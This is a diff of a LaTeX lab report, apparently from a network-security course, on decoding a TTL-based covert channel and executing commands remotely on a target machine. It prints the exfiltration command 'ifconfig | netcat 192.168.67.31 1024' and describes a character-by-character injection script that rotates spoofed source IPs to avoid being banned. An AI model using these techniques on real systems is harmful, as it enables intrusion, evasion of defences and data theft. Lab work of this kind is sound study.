@@ -210,7 +210,7 @@ Due to the spreading of data around several source ports a closer look was taken
 \subsection*{Exercise 2 - Decoding the binary channel}
 The following steps were taken to determine whether the captured stream contains the desired traffic for decoding:
 \begin{itemize}
-\item Export TTL values with the filter applied as .csv file to get a list of all values. The values are 56(1) and 64(0) for all packets, implying a clean binary channel.
+\item Export the TTL values with the filter applied as a .csv-file to receive a list of all values. The TTL-values are 56(1) and 64(0) for all packets, implying a clean binary channel.
 \item Convert the values to 0 and 1 using the LibreOffice's spreadsheet program (Excel equivalent) and string the values together to return the bitstring: 
 \begin{verbatim}
 01111110000000001010111001011100110011100001011010000110101
@@ -291,10 +291,10 @@ The command the needed to be executed on the other computer is:
 ifconfig | netcat 192.168.67.31 1024
 \end{verbatim}
 
-Using the capabilities explored in the previous section, the code was pieced together by using the decimal values of the ASCII characters of the command, and wrote bash script that executed the command for each character. A carriage return was included at the end to execute the command. In order to avoid being banned by Jerry's computer, the destination IPs, and therefore the spoofed source IPs were alternated for each line. (see the file netcat\_ifconfig.sh in the directory workfiles/Ex3)
+Using the capabilities explored in the previous section it is now possible to execute remote code. The code was pieced together by using the decimal values of the ASCII characters. A bash script was written that executes the command for each character. A carriage return was included at the end to execute the command. In order to avoid being banned by Jerry's computer, the destination IPs, and therefore the spoofed source IPs were alternated for each line. (see the file netcat\_ifconfig.sh in the directory workfiles/Ex3)
 
 \newpage
-After running the script the ifconfig information of Jerry's computer can be seen on Tom's Terminal:
+After running the script the ifconfig information of Jerry's computer is sent and displayed on Tom's Terminal:
 
 \begin{verbatim}
 eth0      Link encap:Ethernet  HWaddr 94:de:80:6f:2e:55  
@@ -325,6 +325,6 @@ p3p1      Link encap:Ethernet  HWaddr 94:de:80:6f:2e:45
           Interrupt:19 
 \end{verbatim}
 
-We could now use this information about the network interfaces to start capturing packets on the target's network and send this captured traffic back to our computer.
+It is now possible to use the information from the network interface to start capturing packets on the target network and send the captured traffic back to tom's computer. 
 
 \end{document}
